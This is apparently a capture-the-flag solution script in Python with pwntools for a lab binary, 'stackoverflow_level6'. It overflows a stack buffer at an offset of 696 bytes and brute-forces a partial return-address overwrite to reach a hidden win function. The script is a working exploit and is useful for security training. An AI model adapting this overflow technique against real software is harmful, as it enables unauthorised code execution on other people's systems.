import pwn

# objdump -d /challenge/stackoverflow_level6 | grep -A20 win => 0000000000001351

""" Uncomment this to get cyclic value """
# pwn.context.terminal = ['tmux', 'splitw', '-h']

# proc = pwn.gdb.debug("/challenge/stackoverflow_level6")
# proc.send(pwn.cyclic(2048))
# proc.wait()
""""""

CYCLIC_NUM = 696

combos = [0x03, 0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x93, 0xA3, 0xB3, 0xC3, 0xD3, 0xE3, 0xF3]

for c in combos:
    proc = pwn.process("/challenge/stackoverflow_level6")
    # 1e offset comes from the instruction right before the second puts call in assembly
    payload = b'A'*CYCLIC_NUM + pwn.p8(0x1e) + pwn.p8(c)

    proc.send(payload)

    tmp = proc.recvall(.25).decode()

    if "Here is your" in tmp:
        print(tmp)

    proc.wait()
